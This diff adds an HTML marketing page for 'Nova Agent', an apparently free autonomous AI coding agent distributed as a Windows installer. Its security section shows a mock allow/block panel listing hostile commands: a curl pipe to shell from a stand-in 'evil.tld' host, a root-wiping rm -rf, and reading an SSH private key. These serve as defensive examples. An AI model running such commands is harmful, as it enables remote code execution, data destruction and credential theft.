@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nova Agent — The Autonomous AI Coding Agent</title>
+  <meta name="description" content="Nova Agent doesn't just suggest code. It reads files, runs terminals, manages processes, and finishes tasks autonomously. 100% Free. Bring Your Own Key." />
+  <meta name="theme-color" content="#0a0a0a" />
+  <meta property="og:title" content="Nova Agent — The Autonomous AI Coding Agent" />
+  <meta property="og:description" content="Reads files, runs terminals, manages processes, finishes tasks autonomously. 100% Free & BYOK." />
+  <meta property="og:type" content="website" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace']
+          },
+          colors: {
+            nova: {
+              black: '#0a0a0a',
+              charcoal: '#1a1a1a',
+              violet: '#7c3aed',
+              purple: '#a855f7'
+            }
+          }
+        }
+      }
+    };
+  </script>
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='24' fill='%230a0a0a'/><path d='M28 74V26h10l24 30V26h10v48H62L38 44v30z' fill='%23a855f7'/></svg>" />
+</head>
+<body class="bg-nova-black text-white font-sans antialiased selection:bg-violet-600/40 selection:text-white">
+
+  <!-- Custom Cursor -->
+  <div id="cursor-dot" class="cursor-dot" aria-hidden="true"></div>
+  <div id="cursor-ring" class="cursor-ring" aria-hidden="true"></div>
+
+  <!-- Ambient Background -->
+  <div class="fixed inset-0 -z-10 overflow-hidden pointer-events-none" aria-hidden="true">
+    <div class="aurora aurora-1"></div>
+    <div class="aurora aurora-2"></div>
+    <div class="aurora aurora-3"></div>
+    <div class="grid-overlay"></div>
+    <div class="vignette"></div>
+  </div>
+
+  <!-- Navbar -->
+  <header id="navbar" class="fixed top-0 inset-x-0 z-50 transition-all duration-300">
+    <nav class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+      <div class="flex h-16 md:h-20 items-center justify-between">
+        <!-- Logo -->
+        <a href="index.html" class="group flex items-center gap-2.5 shrink-0">
+          <span class="logo-mark">
+            <svg viewBox="0 0 100 100" class="h-8 w-8" aria-hidden="true">
+              <rect width="100" height="100" rx="24" fill="#12091f" stroke="#7c3aed" stroke-width="4"/>
+              <path d="M28 74V26h10l24 30V26h10v48H62L38 44v30z" fill="#a855f7"/>
+            </svg>
+          </span>
+          <span class="text-lg font-bold tracking-tight">Nova<span class="text-violet-400">Agent</span></span>
+        </a>
+
+        <!-- Desktop links -->
+        <div class="hidden md:flex items-center gap-1">
+          <a href="#features" class="nav-link">Features</a>
+          <a href="#security" class="nav-link">Security</a>
+          <a href="#how" class="nav-link">How it works</a>
+          <a href="#download" class="nav-link">Download</a>
+          <a href="update.html" class="nav-link">Update</a>
+        </div>
+
+        <!-- CTA -->
+        <div class="hidden md:block">
+          <a href="https://github.com/nova-agent-code/nova-agent-code.github.io/releases/download/v1.0.0/Nova-Agent-Setup-1.0.0.1.exe" class="btn-glow btn-sm">
+            <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            Download for Windows
+          </a>
+        </div>
+
+        <!-- Mobile toggle -->
+        <button id="menu-toggle" class="md:hidden relative h-10 w-10 -mr-2 flex items-center justify-center rounded-lg border border-white/10 bg-white/5" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-menu">
+          <span class="menu-bars"><span></span><span></span><span></span></span>
+        </button>
+      </div>
+    </nav>
+
+    <!-- Mobile menu -->
+    <div id="mobile-menu" class="mobile-menu md:hidden">
+      <div class="mobile-menu-inner px-5 py-6">
+        <a href="#features" class="mobile-link">Features</a>
+        <a href="#security" class="mobile-link">Security</a>
+        <a href="#how" class="mobile-link">How it works</a>
+        <a href="#download" class="mobile-link">Download</a>
+        <a href="update.html" class="mobile-link">Update</a>
+        <a href="https://github.com/nova-agent-code/nova-agent-code.github.io/releases/download/v1.0.0/Nova-Agent-Setup-1.0.0.1.exe" class="btn-glow w-full justify-center mt-4">Download for Windows</a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- Hero -->
+    <section class="relative pt-32 md:pt-44 pb-20 md:pb-32 overflow-hidden">
+      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+        <div class="mx-auto max-w-4xl text-center">
+          <!-- Badge -->
+          <div class="reveal inline-flex items-center gap-2 rounded-full border border-violet-500/30 bg-violet-500/10 px-4 py-1.5 text-xs font-medium text-violet-300 backdrop-blur">
+            <span class="relative flex h-2 w-2">
+              <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-violet-400 opacity-75"></span>
+              <span class="relative inline-flex h-2 w-2 rounded-full bg-violet-400"></span>
+            </span>
+            v1.0.0 — Initial commercial release
+          </div>
+
+          <!-- Headline -->
+          <h1 class="reveal mt-7 text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight leading-[1.05]">
+            The Autonomous<br class="hidden sm:block" />
+            <span class="text-gradient">AI Coding Agent.</span>
+          </h1>
+
+          <!-- Subtext -->
+          <p class="reveal mt-6 text-base sm:text-lg lg:text-xl text-white/60 leading-relaxed max-w-3xl mx-auto">
+            Nova Agent doesn't just suggest code. It <span class="text-white/90 font-medium">reads files</span>,
+            <span class="text-white/90 font-medium">runs terminals</span>,
+            <span class="text-white/90 font-medium">manages processes</span>, and
+            <span class="text-white/90 font-medium">finishes tasks autonomously</span>.
+            <span class="block mt-3 text-violet-300 font-semibold">100% Free. Bring Your Own Key.</span>
+          </p>
+
+          <!-- Buttons -->
+          <div class="reveal mt-10 flex flex-col sm:flex-row items-center justify-center gap-4">
+            <a href="https://github.com/nova-agent-code/nova-agent-code.github.io/releases/download/v1.0.0/Nova-Agent-Setup-1.0.0.1.exe" class="btn-glow btn-lg w-full sm:w-auto justify-center">
+              <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              Download Now
+            </a>
+          </div>
+
+          <!-- Stats -->
+          <div class="reveal mt-14 grid grid-cols-2 sm:grid-cols-4 gap-3 max-w-3xl mx-auto">
+            <div class="stat-chip"><span class="stat-num">110+</span><span class="stat-label">LLM Providers</span></div>
+            <div class="stat-chip"><span class="stat-num">100%</span><span class="stat-label">Free &amp; BYOK</span></div>
+            <div class="stat-chip"><span class="stat-num">0</span><span class="stat-label">Telemetry</span></div>
+            <div class="stat-chip"><span class="stat-num">Win</span><span class="stat-label">10 / 11 .EXE</span></div>
+          </div>
+        </div>
+
+        <!-- App preview -->
+        <div class="reveal relative mt-16 md:mt-24 max-w-5xl mx-auto">
+          <div class="preview-glow"></div>
+          <div class="glass-window rounded-2xl overflow-hidden">
+            <div class="window-bar">
+              <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+              <span class="window-title">Nova Agent — autonomous session</span>
+            </div>
+            <img
+              src="assets/app-overview.png"
+              alt="Nova Agent desktop app showing the file explorer, agent chat, and live agent activity panel"
+              width="1365"
+              height="690"
+              class="block w-full h-auto"
+              fetchpriority="high" />
+          </div>
+        </div>
+
+        <!-- Screenshot gallery -->
+        <div class="reveal mt-6 max-w-5xl mx-auto grid grid-cols-1 sm:grid-cols-3 gap-4">
+          <figure class="shot-card">
+            <img src="assets/app-chat.png" alt="Nova Agent agent chat creating project files" width="1365" height="717" loading="lazy" class="block w-full h-auto" />
+            <figcaption>Agent Chat — builds and verifies files</figcaption>
+          </figure>
+          <figure class="shot-card">
+            <img src="assets/app-providers.png" alt="Nova Agent settings for LLM providers, token meter, and context window size" width="1365" height="767" loading="lazy" class="block w-full h-auto" />
+            <figcaption>Settings — providers &amp; context window</figcaption>
+          </figure>
+          <figure class="shot-card">
+            <img src="assets/app-settings-agent.png" alt="Nova Agent AI Agent settings with local mode and token usage toggles" width="798" height="570" loading="lazy" class="block w-full h-auto" />
+            <figcaption>AI Agent — local mode &amp; token meter</figcaption>
+          </figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- Logos / providers marquee -->
+    <section class="py-10 border-y border-white/5 bg-white/[0.02]">
+      <p class="text-center text-xs uppercase tracking-[0.25em] text-white/40 mb-6">Works with 110+ LLM providers</p>
+      <div class="marquee" aria-hidden="true">
+        <div class="marquee-track">
+          <span>OpenAI</span><span>Anthropic</span><span>Google Gemini</span><span>Mistral</span><span>DeepSeek</span><span>Meta Llama</span><span>Cohere</span><span>Perplexity</span><span>Groq</span><span>Together AI</span><span>OpenRouter</span><span>Ollama</span><span>xAI</span><span>AI21</span><span>Fireworks</span>
+          <span>OpenAI</span><span>Anthropic</span><span>Google Gemini</span><span>Mistral</span><span>DeepSeek</span><span>Meta Llama</span><span>Cohere</span><span>Perplexity</span><span>Groq</span><span>Together AI</span><span>OpenRouter</span><span>Ollama</span><span>xAI</span><span>AI21</span><span>Fireworks</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Features -->
+    <section id="features" class="py-24 md:py-32 relative">
+      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+        <div class="max-w-3xl">
+          <p class="reveal section-kicker">Features</p>
+          <h2 class="reveal section-title">Built to run the whole task,<br class="hidden sm:block" /> not just the next line.</h2>
+          <p class="reveal section-sub">Every subsystem exists to let the agent work longer, safer, and with far less context bloat — without you watching it.</p>
+        </div>
+
+        <div class="mt-14 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+          <!-- Card -->
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+            </div>
+            <h3 class="feature-title">Hard Tool Execution Gate</h3>
+            <p class="feature-text">Nothing runs without passing a hard gate. Every shell command, file write, and process spawn is validated against policy before a single byte executes.</p>
+            <span class="feature-tag">Deterministic safety</span>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M7 12h10"/><path d="M10 18h4"/><circle cx="19" cy="12" r="2"/><circle cx="5" cy="18" r="2"/></svg>
+            </div>
+            <h3 class="feature-title">Atomic Tool-Pair Eviction</h3>
+            <p class="feature-text">Tool calls are evicted as intact pairs — never a dangling call without its result. Context stays coherent no matter how long the session runs.</p>
+            <span class="feature-tag">Zero broken state</span>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v18"/><path d="M5 8l7-5 7 5"/><path d="M5 16l7 5 7-5"/></svg>
+            </div>
+            <h3 class="feature-title">Eviction Distillation</h3>
+            <p class="feature-text">Evicted history is distilled, not dropped. Key decisions, file paths, and constraints survive compression so the agent never forgets why it did something.</p>
+            <span class="feature-tag">Long-horizon memory</span>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="7" rx="2"/><rect x="2" y="13" width="20" height="7" rx="2"/><path d="M6 7.5h.01M6 16.5h.01"/></svg>
+            </div>
+            <h3 class="feature-title">PID Background Processes</h3>
+            <p class="feature-text">Dev servers, watchers, and builds run as tracked PID processes in the background — started, monitored, and cleanly terminated by the agent.</p>
+            <span class="feature-tag">Real multitasking</span>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M4.9 4.9l2.1 2.1M17 17l2.1 2.1M19.1 4.9 17 7M7 17l-2.1 2.1"/></svg>
+            </div>
+            <h3 class="feature-title">110+ LLM Providers</h3>
+            <p class="feature-text">OpenAI, Anthropic, Gemini, DeepSeek, Mistral, local Ollama models and more — swap providers per task without changing a single line of your workflow.</p>
+            <span class="feature-tag">Vendor neutral</span>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1.5"/></svg>
+            </div>
+            <h3 class="feature-title">100% Free &amp; BYOK</h3>
+            <p class="feature-text">No subscription, no seat pricing, no usage metering. Bring your own API key — your code and your prompts never touch our servers.</p>
+            <span class="feature-tag">Zero lock-in</span>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- Security -->
+    <section id="security" class="py-24 md:py-32 relative border-y border-white/5 bg-gradient-to-b from-transparent via-violet-950/10 to-transparent">
+      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+        <div class="grid lg:grid-cols-2 gap-14 items-center">
+          <div>
+            <p class="reveal section-kicker">Security</p>
+            <h2 class="reveal section-title">Autonomy with a hard kill-switch.</h2>
+            <p class="reveal section-sub">An agent that can run a terminal needs more than good intentions. Nova Agent enforces safety at the execution layer, not the prompt layer.</p>
+
+            <ul class="mt-8 space-y-4">
+              <li class="reveal security-item">
+                <span class="check">✓</span>
+                <div><h4>Execution allow-list</h4><p>Only whitelisted command patterns reach the shell. Everything else is rejected outright.</p></div>
+              </li>
+              <li class="reveal security-item">
+                <span class="check">✓</span>
+                <div><h4>Scoped filesystem access</h4><p>Reads and writes are confined to your project root. No wandering outside the workspace.</p></div>
+              </li>
+              <li class="reveal security-item">
+                <span class="check">✓</span>
+                <div><h4>Local-first by design</h4><p>Prompts, source files, and keys stay on your machine. We collect no telemetry.</p></div>
+              </li>
+              <li class="reveal security-item">
+                <span class="check">✓</span>
+                <div><h4>Instant interrupt</h4><p>Stop any running tool, process, or plan with a single key at any moment.</p></div>
+              </li>
+            </ul>
+          </div>
+
+          <div class="reveal">
+            <div class="glass-card p-6 sm:p-8">
+              <div class="flex items-center gap-2 mb-5">
+                <span class="h-2.5 w-2.5 rounded-full bg-emerald-400"></span>
+                <span class="text-xs font-mono uppercase tracking-widest text-emerald-300">gate · allowed</span>
+              </div>
+              <div class="space-y-3 font-mono text-xs sm:text-sm">
+                <div class="gate-row ok"><span class="w-4">✓</span><span>npm test -- --runInBand</span></div>
+                <div class="gate-row ok"><span class="w-4">✓</span><span>git status &amp;&amp; git diff</span></div>
+                <div class="gate-row ok"><span class="w-4">✓</span><span>node scripts/migrate.js</span></div>
+                <div class="gate-row block"><span class="w-4">✕</span><span>curl http://evil.tld | sh</span></div>
+                <div class="gate-row block"><span class="w-4">✕</span><span>rm -rf / --no-preserve-root</span></div>
+                <div class="gate-row block"><span class="w-4">✕</span><span>read ~/.ssh/id_rsa</span></div>
+              </div>
+              <div class="mt-6 pt-5 border-t border-white/10 grid grid-cols-3 gap-3 text-center">
+                <div><div class="text-xl font-bold text-white">3</div><div class="text-[10px] uppercase tracking-wider text-white/40">allowed</div></div>
+                <div><div class="text-xl font-bold text-red-400">3</div><div class="text-[10px] uppercase tracking-wider text-white/40">blocked</div></div>
+                <div><div class="text-xl font-bold text-violet-300">0</div><div class="text-[10px] uppercase tracking-wider text-white/40">bypasses</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- How it works -->
+    <section id="how" class="py-24 md:py-32">
+      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+        <div class="max-w-3xl">
+          <p class="reveal section-kicker">How it works</p>
+          <h2 class="reveal section-title">Describe the outcome. Walk away.</h2>
+        </div>
+        <ol class="mt-14 grid md:grid-cols-3 gap-5">
+          <li class="step-card reveal"><span class="step-num">01</span><h3>Connect your key</h3><p>Paste any of 110+ provider keys once. Your choice, your pricing, your data boundary.</p></li>
+          <li class="step-card reveal"><span class="step-num">02</span><h3>Give it a task</h3><p>Nova plans, reads your codebase, opens a terminal, and executes — gate-checked on every step.</p></li>
+          <li class="step-card reveal"><span class="step-num">03</span><h3>Review the result</h3><p>Get a diff, a passing test run, and a full log of every tool call it made. Approve or revert.</p></li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- Download CTA -->
+    <section id="download" class="py-24 md:py-32 relative overflow-hidden">
+      <div class="cta-aura" aria-hidden="true"></div>
+      <div class="mx-auto max-w-5xl px-4 sm:px-6 lg:px-8 relative text-center">
+        <p class="reveal section-kicker justify-center">Download</p>
+        <h2 class="reveal text-3xl sm:text-5xl font-extrabold tracking-tight">Ship code while you sleep.</h2>
+        <p class="reveal mt-5 text-white/60 max-w-2xl mx-auto">Free forever. Windows 10 &amp; 11. Installer sets everything up in under a minute.</p>
+
+        <div class="reveal mt-10">
+          <a href="https://github.com/nova-agent-code/nova-agent-code.github.io/releases/download/v1.0.0/Nova-Agent-Setup-1.0.0.1.exe" class="mega-btn group">
+            <span class="mega-btn-inner">
+              <svg class="h-7 w-7" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              <span>Download Nova Agent for Windows</span>
+            </span>
+            <span class="mega-btn-shine"></span>
+          </a>
+          <p class="mt-4 text-xs text-white/40 font-mono">Nova-Agent-Setup-1.0.0.1.exe · 105 MB · Windows 10/11 (x64)</p>
+        </div>
+
+        <div class="reveal mt-8 flex flex-wrap items-center justify-center gap-x-6 gap-y-2 text-sm text-white/50">
+          <span class="inline-flex items-center gap-2"><span class="text-violet-400">◆</span> No account required</span>
+          <span class="inline-flex items-center gap-2"><span class="text-violet-400">◆</span> No telemetry</span>
+          <span class="inline-flex items-center gap-2"><span class="text-violet-400">◆</span> Already running Nova? <a href="update.html" class="text-violet-300 hover:text-violet-200 underline underline-offset-4">Update page →</a></span>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="border-t border-white/10 bg-black/40 backdrop-blur-xl">
+    <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-12">
+      <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-8">
+        <div>
+          <a href="index.html" class="flex items-center gap-2.5">
+            <svg viewBox="0 0 100 100" class="h-7 w-7" aria-hidden="true"><rect width="100" height="100" rx="24" fill="#12091f" stroke="#7c3aed" stroke-width="4"/><path d="M28 74V26h10l24 30V26h10v48H62L38 44v30z" fill="#a855f7"/></svg>
+            <span class="font-bold">Nova<span class="text-violet-400">Agent</span></span>
+          </a>
+          <p class="mt-3 text-sm text-white/40 max-w-sm">The autonomous AI coding agent. Reads files, runs terminals, finishes tasks — 100% free, bring your own key.</p>
+        </div>
+        <nav class="flex flex-wrap gap-x-8 gap-y-3 text-sm">
+          <a href="#features" class="footer-link">Features</a>
+          <a href="#security" class="footer-link">Security</a>
+          <a href="#download" class="footer-link">Download</a>
+          <a href="update.html" class="footer-link">Updates</a>
+          <a href="privacy.html" class="footer-link">Privacy Policy</a>
+          <a href="terms.html" class="footer-link">Terms of Service</a>
+        </nav>
+      </div>
+      <div class="mt-10 pt-6 border-t border-white/5 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-white/35">
+        <p>© <span id="year">2026</span> Nova Agent. All rights reserved.</p>
+        <p class="font-mono">v1.0.0 · Built for Windows</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="js/main.js"></script>
+</body>
+</html>
